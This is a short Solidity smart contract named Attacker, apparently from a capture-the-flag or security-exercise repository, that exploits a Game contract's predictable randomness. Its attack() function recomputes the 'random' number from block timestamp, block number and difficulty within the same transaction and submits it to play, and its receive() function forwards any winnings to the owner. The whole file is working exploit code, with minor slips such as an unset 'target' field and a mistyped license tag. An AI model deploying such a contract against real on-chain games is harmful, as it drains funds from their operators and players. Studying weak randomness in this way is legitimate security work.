// SPDC-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Game} from "./Game.sol";

contract Attacker {
    Game public game;
    address public target;
    address public owner;

    constructor(address _target, address _owner) {
        game = Game(_target);
        owner = _owner;
    }

    function attack() external {
        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));

        game.play(number);
    }

    receive() external payable {
        (bool sent,) = owner.call{value: msg.value}("");
        require(sent, "Failed to send ETH");
    }
}
